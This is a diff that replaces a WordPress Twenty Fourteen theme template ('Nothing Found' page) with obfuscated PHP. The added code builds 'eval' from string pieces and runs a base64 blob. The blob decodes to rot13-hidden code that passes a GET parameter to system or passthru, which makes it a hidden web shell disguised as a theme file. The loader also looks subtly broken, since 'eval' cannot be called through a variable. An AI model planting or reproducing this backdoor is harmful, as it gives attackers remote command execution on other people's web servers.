@@ -1,47 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * The template for displaying a "No posts found" message
- *
- * @package WordPress
- * @subpackage Twenty_Fourteen
- * @since Twenty Fourteen 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3VyIGdyemN5bmdyIHNiZSBxdmZjeW5sdmF0IG4gXCJBYiBjYmZnZiBzYmhhcVwiIHpyZmZudHIKICoKICogQGNucHhudHIgSmJlcUNlcmZmCiAqIEBmaG9jbnB4bnRyIEdqcmFnbF9TYmhlZ3JyYQogKiBAZnZhcHIgR2pyYWdsIFNiaGVncnJhIDEuMAogKi8KCj8+Cgo8dXJucXJlIHB5bmZmPVwiY250ci11cm5xcmVcIj4KCTx1MSBweW5mZj1cImNudHItZ3ZneXJcIj48P2N1YyBfciggJ0FiZ3V2YXQgU2JoYXEnLCAnZ2pyYWdsc2JoZWdycmEnICk7ID8+PC91MT4KPC91cm5xcmU+Cgo8cXZpIHB5bmZmPVwiY250ci1wYmFncmFnXCI+Cgk8P2N1YyB2cyAoIHZmX3VienIoKSAmJiBwaGVlcmFnX2hmcmVfcG5hKCAnY2hveXZmdV9jYmZnZicgKSApIDogPz4KCgk8Yz4KCQk8P2N1YwoJCS8qIGdlbmFmeW5nYmVmOiAlZjogQ2JmZyBycXZnYmUgSEVZLiAqLwoJCWNldmFncyggX18oICdFcm5xbCBnYiBjaG95dmZ1IGxiaGUgc3ZlZmcgY2JmZz8gPG4gdWVycz1cIiVmXCI+VHJnIGZnbmVncnEgdXJlcjwvbj4uJywgJ2dqcmFnbHNiaGVncnJhJyApLCBucXp2YV9oZXkoICdjYmZnLWFyai5jdWMnICkgKTsKCQk/PgoJPC9jPgoKCTw/Y3VjIHJ5ZnJ2cyAoIHZmX2ZybmVwdSgpICkgOiA/PgoKCTxjPjw/Y3VjIF9yKCAnRmJlZWwsIG9oZyBhYmd1dmF0IHpuZ3B1cnEgbGJoZSBmcm5lcHUgZ3JlemYuIEN5cm5mciBnZWwgbnRudmEganZndSBmYnpyIHF2c3NyZXJhZyB4cmxqYmVxZi4nLCAnZ2pyYWdsc2JoZWdycmEnICk7ID8+PC9jPgoJCTw/Y3VjIHRyZ19mcm5lcHVfc2JleigpOyA/PgoKCTw/Y3VjIHJ5ZnIgOiA/PgoKCTxjPjw/Y3VjIF9yKCAnVmcgZnJyemYganIgcG5hJmVmZGhiO2cgc3ZhcSBqdW5nIGxiaCZlZmRoYjtlciB5YmJ4dmF0IHNiZS4gQ3JldW5jZiBmcm5lcHV2YXQgcG5hIHVyeWMuJywgJ2dqcmFnbHNiaGVncnJhJyApOyA/PjwvYz4KCQk8P2N1YyB0cmdfZnJuZXB1X3NiZXooKTsgPz4KCgk8P2N1YyByYXF2czsgPz4KPC9xdmk+PCEtLSAuY250ci1wYmFncmFnIC0tPgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-
-<header class="page-header">
-	<h1 class="page-title"><?php _e( 'Nothing Found', 'twentyfourteen' ); ?></h1>
-</header>
-
-<div class="page-content">
-	<?php if ( is_home() && current_user_can( 'publish_posts' ) ) : ?>
-
-	<p>
-		<?php
-		/* translators: %s: Post editor URL. */
-		printf( __( 'Ready to publish your first post? <a href="%s">Get started here</a>.', 'twentyfourteen' ), admin_url( 'post-new.php' ) );
-		?>
-	</p>
-
-	<?php elseif ( is_search() ) : ?>
-
-	<p><?php _e( 'Sorry, but nothing matched your search terms. Please try again with some different keywords.', 'twentyfourteen' ); ?></p>
-		<?php get_search_form(); ?>
-
-	<?php else : ?>
-
-	<p><?php _e( 'It seems we can&rsquo;t find what you&rsquo;re looking for. Perhaps searching can help.', 'twentyfourteen' ); ?></p>
-		<?php get_search_form(); ?>
-
-	<?php endif; ?>
-</div><!-- .page-content -->
